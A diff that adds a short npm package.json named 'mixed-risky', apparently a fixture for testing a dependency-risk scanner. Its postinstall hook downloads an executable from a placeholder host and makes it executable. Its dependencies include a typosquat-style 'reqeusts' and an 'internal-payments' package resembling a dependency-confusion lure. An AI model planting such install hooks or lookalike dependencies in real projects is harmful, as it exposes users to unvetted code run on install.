@@ -1,0 +1,12 @@
+{
+  "name": "mixed-risky",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://downloads.example.com/tool.exe -o tool.exe && chmod +x tool.exe"
+  },
+  "dependencies": {
+    "reqeusts": "1.0.0",
+    "internal-payments": "0.1.0",
+    "deprecated-leftpad": "0.0.1"
+  }
+}
